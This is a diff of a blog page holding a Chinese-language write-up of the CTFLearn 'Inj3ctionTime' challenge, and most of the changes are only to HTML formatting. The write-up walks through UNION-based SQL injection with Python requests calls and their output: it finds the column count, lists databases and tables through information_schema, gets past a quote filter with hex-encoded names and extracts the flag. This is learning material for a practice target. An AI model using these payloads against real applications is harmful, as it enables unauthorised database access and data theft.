@@ -2,9 +2,9 @@
 <html lang="en-us">
     <head><meta charset='utf-8'>
 <meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='题目链接：(https://ctflearn.com/challenge/149)
- 此题是我至今做到的最难的题目，因此写一份回顾显得尤为必要。菜鸡成长的路上需要用这种方式积累经验，希望以后能成长为看到这样的题目就直呼简单的高手&amp;hellip; &amp;hellip;
-  根据题意，需要使用UNION语句注入。首先还是先进行简单的注入测试。   ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&amp;#34;id&amp;#34;: &amp;#34;2&amp;#34;}) soup = BeautifulSoup(ret.text, &amp;#39;lxml&amp;#39;) print(soup.prettify()) # Output: # Name: Doodle # Bread: Poodle # Color: Pink 在数字2之后附上简单的布尔表达式，观察结果。
-ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&amp;#34;id&amp;#34;: &amp;#34;2 or 1=1&amp;#34;}) # Output: # 得到了三组Name、Bread、Color，证明布尔语句直接可以起到作用  至此，我们知道可以直接在数字后面跟上一个表达式或者SQL语句，也就是可以直接上UNION语句了。我在今天才算是正式地接触了UNIION注入的流程，以下将做完整的记录和解释。   首先，使用UNION语句判断每一次查询的结果一共有几个字段。原理是使用UNION语句在原本的查询结果后面附加自己构造的一行数据，当我们构造的字段数与原本的字段数不符合时，将引发异常，当字段数匹配时，就有显而易见的效果。首先尝试3个字段。
+此题是我至今做到的最难的题目，因此写一份回顾显得尤为必要。菜鸡成长的路上需要用这种方式积累经验，希望以后能成长为看到这样的题目就直呼简单的高手&amp;hellip; &amp;hellip;
+根据题意，需要使用UNION语句注入。首先还是先进行简单的注入测试。 ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&amp;#34;id&amp;#34;: &amp;#34;2&amp;#34;}) soup = BeautifulSoup(ret.text, &amp;#39;lxml&amp;#39;) print(soup.prettify()) # Output: # Name: Doodle # Bread: Poodle # Color: Pink 在数字2之后附上简单的布尔表达式，观察结果。
+ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&amp;#34;id&amp;#34;: &amp;#34;2 or 1=1&amp;#34;}) # Output: # 得到了三组Name、Bread、Color，证明布尔语句直接可以起到作用 至此，我们知道可以直接在数字后面跟上一个表达式或者SQL语句，也就是可以直接上UNION语句了。我在今天才算是正式地接触了UNIION注入的流程，以下将做完整的记录和解释。 首先，使用UNION语句判断每一次查询的结果一共有几个字段。原理是使用UNION语句在原本的查询结果后面附加自己构造的一行数据，当我们构造的字段数与原本的字段数不符合时，将引发异常，当字段数匹配时，就有显而易见的效果。首先尝试3个字段。
 ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&amp;#34;id&amp;#34;: &amp;#34;-2 union select 1,2,3&amp;#34;}) # Output: # 0 results 结果表明3个字段是不对的，那么再增加：
 ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&amp;#34;id&amp;#34;: &amp;#34;-2 union select 1,2,3,4&amp;#34;}) # Output: # Name: 2 # Breed: 1 # Color: 3 非常Nice，不仅表明了查询的结果有四个字段，而且显示出每个字段对应的是什么含义。再试试5个字段：'><title>CTFLearn-Inj3ctionTime</title>
 
@@ -31,9 +31,9 @@ ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&am
 
 <meta property='og:title' content='CTFLearn-Inj3ctionTime'>
 <meta property='og:description' content='题目链接：(https://ctflearn.com/challenge/149)
- 此题是我至今做到的最难的题目，因此写一份回顾显得尤为必要。菜鸡成长的路上需要用这种方式积累经验，希望以后能成长为看到这样的题目就直呼简单的高手&amp;hellip; &amp;hellip;
-  根据题意，需要使用UNION语句注入。首先还是先进行简单的注入测试。   ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&amp;#34;id&amp;#34;: &amp;#34;2&amp;#34;}) soup = BeautifulSoup(ret.text, &amp;#39;lxml&amp;#39;) print(soup.prettify()) # Output: # Name: Doodle # Bread: Poodle # Color: Pink 在数字2之后附上简单的布尔表达式，观察结果。
-ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&amp;#34;id&amp;#34;: &amp;#34;2 or 1=1&amp;#34;}) # Output: # 得到了三组Name、Bread、Color，证明布尔语句直接可以起到作用  至此，我们知道可以直接在数字后面跟上一个表达式或者SQL语句，也就是可以直接上UNION语句了。我在今天才算是正式地接触了UNIION注入的流程，以下将做完整的记录和解释。   首先，使用UNION语句判断每一次查询的结果一共有几个字段。原理是使用UNION语句在原本的查询结果后面附加自己构造的一行数据，当我们构造的字段数与原本的字段数不符合时，将引发异常，当字段数匹配时，就有显而易见的效果。首先尝试3个字段。
+此题是我至今做到的最难的题目，因此写一份回顾显得尤为必要。菜鸡成长的路上需要用这种方式积累经验，希望以后能成长为看到这样的题目就直呼简单的高手&amp;hellip; &amp;hellip;
+根据题意，需要使用UNION语句注入。首先还是先进行简单的注入测试。 ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&amp;#34;id&amp;#34;: &amp;#34;2&amp;#34;}) soup = BeautifulSoup(ret.text, &amp;#39;lxml&amp;#39;) print(soup.prettify()) # Output: # Name: Doodle # Bread: Poodle # Color: Pink 在数字2之后附上简单的布尔表达式，观察结果。
+ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&amp;#34;id&amp;#34;: &amp;#34;2 or 1=1&amp;#34;}) # Output: # 得到了三组Name、Bread、Color，证明布尔语句直接可以起到作用 至此，我们知道可以直接在数字后面跟上一个表达式或者SQL语句，也就是可以直接上UNION语句了。我在今天才算是正式地接触了UNIION注入的流程，以下将做完整的记录和解释。 首先，使用UNION语句判断每一次查询的结果一共有几个字段。原理是使用UNION语句在原本的查询结果后面附加自己构造的一行数据，当我们构造的字段数与原本的字段数不符合时，将引发异常，当字段数匹配时，就有显而易见的效果。首先尝试3个字段。
 ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&amp;#34;id&amp;#34;: &amp;#34;-2 union select 1,2,3&amp;#34;}) # Output: # 0 results 结果表明3个字段是不对的，那么再增加：
 ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&amp;#34;id&amp;#34;: &amp;#34;-2 union select 1,2,3,4&amp;#34;}) # Output: # Name: 2 # Breed: 1 # Color: 3 非常Nice，不仅表明了查询的结果有四个字段，而且显示出每个字段对应的是什么含义。再试试5个字段：'>
 <meta property='og:url' content='https://xrg.fj.cn/p/ctflearn-inj3ctiontime/'>
@@ -41,9 +41,9 @@ ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&am
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='CTF' /><meta property='article:published_time' content='2020-09-18T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2020-09-18T00:00:00&#43;00:00'/>
 <meta name="twitter:title" content="CTFLearn-Inj3ctionTime">
 <meta name="twitter:description" content="题目链接：(https://ctflearn.com/challenge/149)
- 此题是我至今做到的最难的题目，因此写一份回顾显得尤为必要。菜鸡成长的路上需要用这种方式积累经验，希望以后能成长为看到这样的题目就直呼简单的高手&amp;hellip; &amp;hellip;
-  根据题意，需要使用UNION语句注入。首先还是先进行简单的注入测试。   ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&amp;#34;id&amp;#34;: &amp;#34;2&amp;#34;}) soup = BeautifulSoup(ret.text, &amp;#39;lxml&amp;#39;) print(soup.prettify()) # Output: # Name: Doodle # Bread: Poodle # Color: Pink 在数字2之后附上简单的布尔表达式，观察结果。
-ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&amp;#34;id&amp;#34;: &amp;#34;2 or 1=1&amp;#34;}) # Output: # 得到了三组Name、Bread、Color，证明布尔语句直接可以起到作用  至此，我们知道可以直接在数字后面跟上一个表达式或者SQL语句，也就是可以直接上UNION语句了。我在今天才算是正式地接触了UNIION注入的流程，以下将做完整的记录和解释。   首先，使用UNION语句判断每一次查询的结果一共有几个字段。原理是使用UNION语句在原本的查询结果后面附加自己构造的一行数据，当我们构造的字段数与原本的字段数不符合时，将引发异常，当字段数匹配时，就有显而易见的效果。首先尝试3个字段。
+此题是我至今做到的最难的题目，因此写一份回顾显得尤为必要。菜鸡成长的路上需要用这种方式积累经验，希望以后能成长为看到这样的题目就直呼简单的高手&amp;hellip; &amp;hellip;
+根据题意，需要使用UNION语句注入。首先还是先进行简单的注入测试。 ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&amp;#34;id&amp;#34;: &amp;#34;2&amp;#34;}) soup = BeautifulSoup(ret.text, &amp;#39;lxml&amp;#39;) print(soup.prettify()) # Output: # Name: Doodle # Bread: Poodle # Color: Pink 在数字2之后附上简单的布尔表达式，观察结果。
+ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&amp;#34;id&amp;#34;: &amp;#34;2 or 1=1&amp;#34;}) # Output: # 得到了三组Name、Bread、Color，证明布尔语句直接可以起到作用 至此，我们知道可以直接在数字后面跟上一个表达式或者SQL语句，也就是可以直接上UNION语句了。我在今天才算是正式地接触了UNIION注入的流程，以下将做完整的记录和解释。 首先，使用UNION语句判断每一次查询的结果一共有几个字段。原理是使用UNION语句在原本的查询结果后面附加自己构造的一行数据，当我们构造的字段数与原本的字段数不符合时，将引发异常，当字段数匹配时，就有显而易见的效果。首先尝试3个字段。
 ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&amp;#34;id&amp;#34;: &amp;#34;-2 union select 1,2,3&amp;#34;}) # Output: # 0 results 结果表明3个字段是不对的，那么再增加：
 ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&amp;#34;id&amp;#34;: &amp;#34;-2 union select 1,2,3,4&amp;#34;}) # Output: # Name: 2 # Breed: 1 # Color: 3 非常Nice，不仅表明了查询的结果有四个字段，而且显示出每个字段对应的是什么含义。再试试5个字段：">
     <link rel="shortcut icon" href="/favicon.ico" />
@@ -314,46 +314,46 @@ ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&am
 <li>根据题意，需要使用UNION语句注入。首先还是先进行简单的注入测试。</li>
 </ol>
 <blockquote>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">ret</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;https://web.ctflearn.com/web8/&#34;</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;2&#34;</span><span class="p">})</span>
-<span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">ret</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="s1">&#39;lxml&#39;</span><span class="p">)</span>
-<span class="nb">print</span><span class="p">(</span><span class="n">soup</span><span class="o">.</span><span class="n">prettify</span><span class="p">())</span>
-
-<span class="c1"># Output:</span>
-<span class="c1"># Name: Doodle</span>
-<span class="c1"># Bread: Poodle</span>
-<span class="c1"># Color: Pink</span>
-</code></pre></div><p>在数字2之后附上简单的布尔表达式，观察结果。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">ret</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;https://web.ctflearn.com/web8/&#34;</span><span class="p">,</span> 
-                   <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;2 or 1=1&#34;</span><span class="p">})</span>
-
-<span class="c1"># Output:</span>
-<span class="c1"># 得到了三组Name、Bread、Color，证明布尔语句直接可以起到作用</span>
-</code></pre></div></blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;https://web.ctflearn.com/web8/&#34;</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;2&#34;</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">ret</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="s1">&#39;lxml&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">soup</span><span class="o">.</span><span class="n">prettify</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Output:</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Name: Doodle</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Bread: Poodle</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Color: Pink</span>
+</span></span></code></pre></div><p>在数字2之后附上简单的布尔表达式，观察结果。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;https://web.ctflearn.com/web8/&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                   <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;2 or 1=1&#34;</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Output:</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 得到了三组Name、Bread、Color，证明布尔语句直接可以起到作用</span>
+</span></span></code></pre></div></blockquote>
 <ol start="2">
 <li>至此，我们知道可以直接在数字后面跟上一个表达式或者SQL语句，也就是可以直接上UNION语句了。我在今天才算是正式地接触了UNIION注入的流程，以下将做完整的记录和解释。</li>
 </ol>
 <blockquote>
 <p>首先，使用UNION语句判断每一次查询的结果一共有几个字段。原理是使用UNION语句在原本的查询结果后面附加自己构造的一行数据，当我们构造的字段数与原本的字段数不符合时，将引发异常，当字段数匹配时，就有显而易见的效果。首先尝试3个字段。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">ret</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;https://web.ctflearn.com/web8/&#34;</span><span class="p">,</span> 
-                   <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;-2 union select 1,2,3&#34;</span><span class="p">})</span>
-
-<span class="c1"># Output:</span>
-<span class="c1"># 0 results</span>
-</code></pre></div><p>结果表明3个字段是不对的，那么再增加：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">ret</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;https://web.ctflearn.com/web8/&#34;</span><span class="p">,</span> 
-                   <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;-2 union select 1,2,3,4&#34;</span><span class="p">})</span>
-
-<span class="c1"># Output:</span>
-<span class="c1"># Name: 2</span>
-<span class="c1"># Breed: 1</span>
-<span class="c1"># Color: 3</span>
-</code></pre></div><p>非常Nice，不仅表明了查询的结果有<strong>四个字段</strong>，而且显示出<strong>每个字段对应的是什么含义</strong>。再试试5个字段：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">ret</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;https://web.ctflearn.com/web8/&#34;</span><span class="p">,</span> 
-                   <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;2 union select 1,2,3,4,5&#34;</span><span class="p">})</span>
-
-<span class="c1"># Output:</span>
-<span class="c1"># 0 results</span>
-</code></pre></div><p>已经明确了，系统做的每一次查询结果就是有<strong>四个字段</strong>，只需要将<strong>对应字段的数字改为SQL语句，就可以把我们需要的信息在相应字段显示出来</strong>。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;https://web.ctflearn.com/web8/&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                   <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;-2 union select 1,2,3&#34;</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Output:</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 0 results</span>
+</span></span></code></pre></div><p>结果表明3个字段是不对的，那么再增加：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;https://web.ctflearn.com/web8/&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                   <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;-2 union select 1,2,3,4&#34;</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Output:</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Name: 2</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Breed: 1</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Color: 3</span>
+</span></span></code></pre></div><p>非常Nice，不仅表明了查询的结果有<strong>四个字段</strong>，而且显示出<strong>每个字段对应的是什么含义</strong>。再试试5个字段：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;https://web.ctflearn.com/web8/&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                   <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;2 union select 1,2,3,4,5&#34;</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Output:</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 0 results</span>
+</span></span></code></pre></div><p>已经明确了，系统做的每一次查询结果就是有<strong>四个字段</strong>，只需要将<strong>对应字段的数字改为SQL语句，就可以把我们需要的信息在相应字段显示出来</strong>。</p>
 </blockquote>
 <blockquote>
 <p>开始查看数据库名，使用<strong>database()函数</strong>或者<strong>information_schema数据库维护的信息</strong>。</p>
@@ -363,25 +363,25 @@ ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&am
 </ul>
 </blockquote>
 <p>在此仅记录第二种办法。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">ret</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;https://web.ctflearn.com/web8/&#34;</span><span class="p">,</span> 
-                   <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;2 union select 1,(select group_concat(schema_name) from information_schema.schemata),3,4&#34;</span><span class="p">})</span>
-
-<span class="c1"># Output:</span>
-<span class="c1"># Name: Information_schema, webeight</span>
-<span class="c1"># Breed: 1</span>
-<span class="c1"># Color: 3</span>
-</code></pre></div><p>这里，group_concat使得查询结果是批量的，而第二个字段对应地显示出了我们希望看到的——所有的数据库名。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;https://web.ctflearn.com/web8/&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                   <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;2 union select 1,(select group_concat(schema_name) from information_schema.schemata),3,4&#34;</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Output:</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Name: Information_schema, webeight</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Breed: 1</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Color: 3</span>
+</span></span></code></pre></div><p>这里，group_concat使得查询结果是批量的，而第二个字段对应地显示出了我们希望看到的——所有的数据库名。</p>
 </blockquote>
 <blockquote>
 <p>开始查询webeight数据库中的数据表。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">ret</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;https://web.ctflearn.com/web8/&#34;</span><span class="p">,</span> 
-                   <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;2 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=0x7765626569676874),3,4&#34;</span><span class="p">})</span>
-
-<span class="c1"># Output:</span>
-<span class="c1"># Name: w0w_y0u_f0und_m3,webeight</span>
-<span class="c1"># Breed: 1</span>
-<span class="c1"># Color: 3</span>
-</code></pre></div><p>这里需要注意，本来第二个字段的SQL语句应该是：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;https://web.ctflearn.com/web8/&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                   <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;2 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=0x7765626569676874),3,4&#34;</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Output:</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Name: w0w_y0u_f0und_m3,webeight</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Breed: 1</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Color: 3</span>
+</span></span></code></pre></div><p>这里需要注意，本来第二个字段的SQL语句应该是：</p>
 <p><code>select group_concat(table_name) from information_schema.tables where table_schema='webeight'</code></p>
 <p>但是，这道题中的<strong>单引号是被过滤的！</strong></p>
 <p>于是采用十六进制来表示<code>webeight</code>这个字符串，直接转换，<!-- raw HTML omitted -->不需要考虑什么大端小端存储<!-- raw HTML omitted -->-。（我在说什么x）</p>
@@ -391,22 +391,22 @@ ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&am
 </blockquote>
 <blockquote>
 <p>得到表之后，要查找字段了。方法差不多，总的来说就是在折腾information_schema库中存储的信息而已。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">select</span> <span class="n">group_concat</span><span class="p">(</span><span class="n">column_name</span><span class="p">)</span> <span class="kn">from</span> <span class="nn">information_schema.columns</span> <span class="n">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="mh">0x7765626569676874</span> <span class="ow">and</span> <span class="n">table_name</span><span class="o">=</span><span class="mh">0x7730775f7930755f6630756e645f6d33</span>
-
-<span class="c1"># Output:</span>
-<span class="c1"># Name: f0und_m3</span>
-<span class="c1"># ...</span>
-</code></pre></div><p>这里是第二个字段要填入的SQL语句，比较长，因此不写出完整的python语句，以免阻碍观瞻。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">select</span> <span class="n">group_concat</span><span class="p">(</span><span class="n">column_name</span><span class="p">)</span> <span class="kn">from</span> <span class="nn">information_schema.columns</span> <span class="n">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="mh">0x7765626569676874</span> <span class="ow">and</span> <span class="n">table_name</span><span class="o">=</span><span class="mh">0x7730775f7930755f6630756e645f6d33</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Output:</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Name: f0und_m3</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># ...</span>
+</span></span></code></pre></div><p>这里是第二个字段要填入的SQL语句，比较长，因此不写出完整的python语句，以免阻碍观瞻。</p>
 <p>此处要注意，group_concat()中的字段名<strong>column_name</strong>是一定不能改的，包括之前的所有SQL语句，<strong>在查询information库的时候，选用的字段名要按照规定的来，否则必然得不到结果。</strong></p>
 </blockquote>
 <blockquote>
 <p>以上已经得到了目标表的目标字段，使用最后一个简单的查询结束这道题：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">select</span> <span class="n">f0und_m3</span> <span class="kn">from</span> <span class="nn">w0w_y0u_f0und_m3</span>
-
-<span class="c1"># Output:</span>
-<span class="c1"># Name: abctf{uni0n_1s_4_gr34t_c0mm4nd}</span>
-<span class="c1"># ...</span>
-</code></pre></div></blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">select</span> <span class="n">f0und_m3</span> <span class="kn">from</span> <span class="nn">w0w_y0u_f0und_m3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Output:</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Name: abctf{uni0n_1s_4_gr34t_c0mm4nd}</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># ...</span>
+</span></span></code></pre></div></blockquote>
 <ol start="3">
 <li>总结</li>
 </ol>
